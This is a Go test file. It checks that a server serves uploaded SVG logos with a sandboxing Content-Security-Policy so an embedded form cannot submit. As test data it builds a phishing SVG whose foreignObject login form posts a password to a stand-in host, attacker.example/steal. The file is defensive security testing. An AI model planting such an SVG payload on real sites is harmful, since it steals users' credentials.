package server

import (
	"encoding/base64"
	"net/http"
	"strings"
	"testing"
)

// An SVG logo opened directly is a document. A <foreignObject> in one can hold
// a login form that posts to another site while the address bar shows this
// one, so the response is sandboxed and cannot submit a form anywhere.
func TestAnSVGLogoOpenedDirectlyCannotSubmitAForm(t *testing.T) {
	in := newInstance(t)
	admin := in.register("admin", "a-strong-password")

	phish := `<svg xmlns="http://www.w3.org/2000/svg" width="400" height="200">` +
		`<foreignObject width="400" height="200">` +
		`<form xmlns="http://www.w3.org/1999/xhtml" action="https://attacker.example/steal" method="post">` +
		`<input name="password" type="password"><button>Sign in</button></form>` +
		`</foreignObject></svg>`
	put := in.do(http.MethodPut, "/api/admin/logo", map[string]string{
		"mime": "image/svg+xml",
		"data": base64.StdEncoding.EncodeToString([]byte(phish)),
	}, admin)
	if put.Code != http.StatusOK {
		t.Fatalf("upload the logo: %d %s", put.Code, put.Body.String())
	}

	got := in.do(http.MethodGet, "/api/site/logo", nil, nil)
	if got.Code != http.StatusOK || got.Header().Get("Content-Type") != "image/svg+xml" {
		t.Fatalf("GET logo: %d %s", got.Code, got.Header().Get("Content-Type"))
	}
	policy := got.Header().Get("Content-Security-Policy")
	for _, directive := range []string{"sandbox", "form-action 'none'", "default-src 'none'"} {
		if !strings.Contains(policy, directive) {
			t.Errorf("Content-Security-Policy = %q, missing %q", policy, directive)
		}
	}
}
